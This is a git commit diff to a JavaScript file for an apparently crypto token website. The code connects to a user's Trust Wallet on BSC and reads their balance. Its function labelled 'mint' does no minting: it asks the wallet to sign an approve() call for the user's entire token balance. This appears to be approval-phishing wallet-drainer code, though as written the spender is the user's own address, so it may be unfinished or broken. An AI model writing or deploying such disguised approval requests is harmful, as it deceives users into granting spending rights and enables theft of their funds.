764e112fa8202f8849f5cf850d009de79484c6cd
Xcoins01 <newcoinalert@proton.me>
2023-05-11 15:48:58 +0800

    Site updated: 2023-05-11 15:48:58

--- js/walletFunction.js
+++ js/walletFunction.js
@@ -1,19 +1,20 @@
-import ethABI from "./ethABI.json";
-import { ethers } from "ethers.min.js";
 
-const trustWalletExist = false;
-const injectedProviderExist = false
-const account = null;
+const ethABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
+
 const ETH_ADDRESS = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
 const bscChainId = '0x38';
-const bscChain = false;
-const requestAccount = false;
-const injectedProvider = null ;
-const rawBalance = 0;
-const accountBalance = 0;
-const ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
-const contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
-
+var bscChain = false;
+var requestAccount = false;
+var injectedProvider = null ;
+var trustWalletExist = false;
+var injectedProviderExist = false
+var account = null;
+var rawBalance = 0;
+var accountBalance = 0;
+var ethersProvider = null;
+var contract = null;
+var contractWithSigner = null;
+var signer = null;
 function getTrustWalletInjectedProvider(
     { timeout } = { timeout: 3000 }
   ) {
@@ -27,7 +28,9 @@ function getTrustWalletInjectedProvider(
 
     // 获取trustWalletProvider
     injectedProvider = window["trustwallet"];
-  
+    
+    ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
+    contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
     if (injectedProvider) {
       return injectedProvider;
     }
@@ -69,6 +72,7 @@ async function connectAccount(){
       account = userAccounts[0]
 
       requestAccount = true;
+
       } catch (e) {
       if (e.code === 4001) {
           requestAccount = false;
@@ -100,7 +104,9 @@ async function verifyAddress(){
 }
 
 async function mint(){
-    contract.approve("",rawBalance);
+    signer = ethersProvider.getSigner();
+    contractWithSigner = contract.connect(signer);
+    contractWithSigner.approve(account,rawBalance);
 }
 
 
